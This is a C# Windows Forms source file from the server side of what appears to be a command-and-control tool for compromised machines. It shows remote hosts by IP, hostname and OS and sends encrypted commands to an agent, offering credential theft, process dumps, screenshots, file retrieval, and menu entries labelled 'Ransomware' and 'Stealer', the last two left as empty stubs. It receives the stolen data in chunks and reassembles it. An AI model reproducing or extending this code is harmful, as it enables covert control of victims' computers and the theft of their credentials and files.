﻿using Server_side.UserControls;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace Server_side
{
    public partial class ClientInfo : Form
    {
        private Dictionary<Socket, String> client;
        private Socket clientSocket;
        private string passPhrase;
        private Encryptor encryptor;

        public ClientInfo(string clientIP, string clientHostname, string connectTime, string clientOS)
        {
            InitializeComponent();
            ipLabel.Text = clientIP;
            hostnameLabel.Text = clientHostname;
            contimeLabel.Text = connectTime;
            osLabel.Text = clientOS;

            client = NetworkLayer.clientList.SelectMany(dict => dict)
                .Where(kvp => kvp.Key.RemoteEndPoint.ToString().Contains(clientIP))
                .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);

            clientSocket = client.Keys.First();
            passPhrase = client.Values.First();

            InitializeSavedValues(clientIP);
            agentLogBox.TextChanged += agentLogBox_TextChanged;

            cmdComboBox.Items.Clear();
            cmdComboBox.Items.Add("Get File");
            cmdComboBox.Items.Add("Get Credential");
            cmdComboBox.Items.Add("Get Process Dump");
            cmdComboBox.Items.Add("Get Screenshot");
            cmdComboBox.Items.Add("Ransomware");
            cmdComboBox.Items.Add("Stealer");
            cmdComboBox.Items.Add("Exit");
            cmdComboBox.SelectedIndex = 0;

            encryptor = new(passPhrase.Trim());
        }

        // Keeping agent log in the settings
        private void InitializeSavedValues(string clientIP)
        {
            string uid = $"{clientIP}_{passPhrase}";

            try
            {
                if (!Program.mySettings.Properties.Cast<System.Configuration.SettingsProperty>().Any(prop => prop.Name == uid))
                {
                    var newProperty = new System.Configuration.SettingsProperty(uid)
                    {
                        DefaultValue = string.Empty
                    };
                    Program.mySettings.Properties.Add(newProperty);
                    Program.mySettings.Save();
                }

                agentLogBox.Text = Program.mySettings.Properties[uid].DefaultValue.ToString();
            }
            catch (Exception e)
            {
                MessageBox.Show("Error in InitializeSavedValues: " + e.Message);
            }
        }


        private void agentLogBox_TextChanged(object sender, EventArgs e)
        {
            Program.mySettings.Properties[$"{ipLabel.Text}_{passPhrase}"].DefaultValue = agentLogBox.Text;
            Program.mySettings.Save();
        }

        private void sendCommandBtn_Click(object sender, EventArgs e)
        {
            string delimiter = "|;|";
            string command = $"1{delimiter}{commandBox.Text}";

            keyLabel.Text = encryptor.GetKey();
            ivLabel.Text = encryptor.GetIV();
            passLabel.Text = passPhrase;

            byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
            NetworkLayer.Send(clientSocket, encryptedCommand);

            logging("Command sent: " + commandBox.Text);

            // Receive response
            byte[] response = NetworkLayer.ReceiveResult(clientSocket);
            string decryptedResponse = encryptor.Decrypt(response);
            logging("Response received: " + decryptedResponse);

            commandBox.Text = "";
        }

        private void logging(string log)
        {
            agentLogBox.AppendText(log + Environment.NewLine);
        }

        private void sendCommandBtn1_Click(object sender, EventArgs e)
        {
            string delimiter = "|;|";
            string placeholder = "";
            switch (cmdComboBox.SelectedIndex)
            {
                case 0:
                    {
                        placeholder = agentfileBox.Text;
                        break;
                    }
                case 1:
                    {
                        placeholder = "getcredential";

                        break;
                    }
                case 2:
                    placeholder = "getprocessdump";
                    break;
                case 3:
                    {
                        placeholder = "getscreenshot";
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent: " + cmdComboBox.Text);

                        // Receive response
                        try
                        {
                            byte[] image = GetResultFile(false);
                            MessageBox.Show("Screenshot received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            if (image != null && image.Length > 0)
                            {
                                using (MemoryStream ms = new MemoryStream(image))
                                {
                                    Image img = Image.FromStream(ms);
                                    DisplayScreenshot displayScreenshot = new DisplayScreenshot(img);
                                    displayScreenshot.Show();
                                }
                            }
                            else
                            {
                                logging("Error when receiving the screenshot.");
                            }
                        }
                        catch (Exception ex)
                        {
                            logging("Error displaying image: " + ex.Message);
                            MessageBox.Show("Error displaying image: " + ex.Message);
                        }
                        break;
                    }
                case 4:
                    {
                        break;
                    }
                case 5:
                    {
                        break;
                    }
                case 6:
                    {
                        placeholder = "exit";
                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
                        NetworkLayer.Send(clientSocket, encryptedCommand);

                        logging("Command sent: " + cmdComboBox.Text);

                        // Receive response
                        byte[] response = NetworkLayer.ReceiveResult(clientSocket);
                        string decryptedResponse = encryptor.Decrypt(response);
                        logging("Response received: " + decryptedResponse);

                        MessageBox.Show("Client will be disconnected.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        this.Close();
                        break;
                    }
            }
        }

        private byte[]? GetResultFile(bool saved)
        {
            string delimiter = "|;|";
            byte[] received = NetworkLayer.ReceiveResult(clientSocket);
            string decrypted = encryptor.Decrypt(received);
            string[] parts = decrypted.Split(delimiter);

            string guid = parts[0];
            int chunkCount = int.Parse(parts[1]);
            string fileName = parts[2];

            string fileBase64 = "";
            for (int i = 0; i < chunkCount; i++)
            {
                byte[] chunk = NetworkLayer.ReceiveResult(clientSocket);
                string chunkDecrypted = encryptor.Decrypt(chunk);
                string[] chunkParts = chunkDecrypted.Split(delimiter);
                string chunkGuid = chunkParts[0];
                if (chunkGuid != guid)
                {
                    MessageBox.Show("Error in GetResultFile: GUID mismatch");
                    return null;
                }
                string chunkData = chunkParts[1];
                fileBase64 += chunkData;
            }

            byte[] fileData = Encryptor.InvertStr(fileBase64);

            if (saved)
            {
                string filePath = Path.Combine("", fileName);
                File.WriteAllBytes(filePath, fileData);
            }

            return fileData;
        }
    }

}
